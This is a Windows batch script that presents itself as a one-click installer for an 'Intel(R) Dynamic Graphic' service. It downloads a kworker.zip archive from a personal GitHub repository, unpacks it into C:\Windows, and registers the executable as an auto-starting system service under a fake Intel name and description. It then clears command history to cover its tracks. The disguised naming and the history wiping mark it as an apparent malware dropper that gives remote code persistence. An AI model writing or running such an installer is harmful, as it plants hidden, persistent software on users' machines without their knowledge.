@echo off
chcp 65001 >nul
title Intel(R) Dynamic Graphic 一键安装脚本
echo ==========================================
echo   Intel(R) Dynamic Graphic 一键安装脚本
echo ==========================================
echo.

REM 设置变量
set SERVICE_NAME=Intel(R) Dynamic Graphic
set INSTALL_DIR=C:\Windows\Intel(R) Dynamic Graphic
set DOWNLOAD_URL=https://raw.githubusercontent.com/wondream322/kworker/master/win/kworker.zip

REM 检查管理员权限
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [错误] 请以管理员身份运行此脚本
    echo 右键点击 install.bat - 选择"以管理员身份运行"
    pause
    exit /b 1
)

echo [信息] 正在创建安装目录...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
if %errorlevel% neq 0 (
    echo [错误] 创建目录失败
    pause
    exit /b 1
)
echo [成功] 目录创建成功: %INSTALL_DIR%
echo.

echo [信息] 正在下载程序包...
cd /d "%INSTALL_DIR%"

REM 使用 PowerShell 下载
powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile 'kworker.zip'" 2>nul

if not exist "kworker.zip" (
    echo [错误] 下载失败，请检查网络连接
    echo 下载地址: %DOWNLOAD_URL%
    pause
    exit /b 1
)
echo [成功] 下载完成
echo.

echo [信息] 正在解压文件...
powershell -Command "Expand-Archive -Path 'kworker.zip' -DestinationPath '%INSTALL_DIR%' -Force"
if %errorlevel% neq 0 (
    echo [错误] 解压失败
    pause
    exit /b 1
)
echo [成功] 解压完成
echo.

echo [信息] 正在清理临时文件...
del kworker.zip 2>nul
echo.

REM 检查可执行文件
if not exist "%INSTALL_DIR%\Intel(R) Dynamic Graphic.exe" (
    echo [错误] 未找到 Intel(R) Dynamic Graphic.exe
    echo 请确保压缩包内包含此文件
    pause
    exit /b 1
)

echo [信息] 正在安装 Windows 服务...

REM 删除旧服务（如果存在）
sc query "%SERVICE_NAME%" >nul 2>&1
if %errorlevel% equ 0 (
    echo [信息] 检测到旧服务，正在删除...
    sc stop "%SERVICE_NAME%" >nul 2>&1
    timeout /t 2 /nobreak >nul
    sc delete "%SERVICE_NAME%" >nul 2>&1
    timeout /t 1 /nobreak >nul
)

REM 创建服务（服务名使用完整名称，包含空格和括号需要用引号括起来）
sc create "%SERVICE_NAME%" binPath= "\"%INSTALL_DIR%\Intel(R) Dynamic Graphic.exe\" --config=\"%INSTALL_DIR%\c\"" start= auto DisplayName= "%SERVICE_NAME%" >nul
if %errorlevel% neq 0 (
    echo [错误] 服务创建失败
    pause
    exit /b 1
)

REM 设置服务描述
sc description "%SERVICE_NAME%" "Intel 动态图形管理服务" >nul
echo [成功] 服务创建成功
echo.

echo [信息] 正在启动服务...
sc start "%SERVICE_NAME%" >nul
if %errorlevel% neq 0 (
    echo [警告] 服务启动失败，请手动检查
    sc query "%SERVICE_NAME%"
) else (
    echo [成功] 服务启动成功
)
echo.

echo [信息] 设置服务开机自启...
sc config "%SERVICE_NAME%" start= auto >nul
echo.

echo ==========================================
echo [成功] Intel(R) Dynamic Graphic 安装完成！
echo ==========================================
echo 安装目录: %INSTALL_DIR%
echo 服务名称: %SERVICE_NAME%
echo.
echo 常用命令:
echo   查看状态: sc query "%SERVICE_NAME%"
echo   启动服务: sc start "%SERVICE_NAME%"
echo   停止服务: sc stop "%SERVICE_NAME%"
echo   删除服务: sc delete "%SERVICE_NAME%"
echo.
echo 管理工具: 运行 services.msc 查看服务列表
echo ==========================================

REM 清理历史记录
echo. > "%USERPROFILE%\.history_tmp" 2>nul
powershell -Command "Clear-History" 2>nul

pause
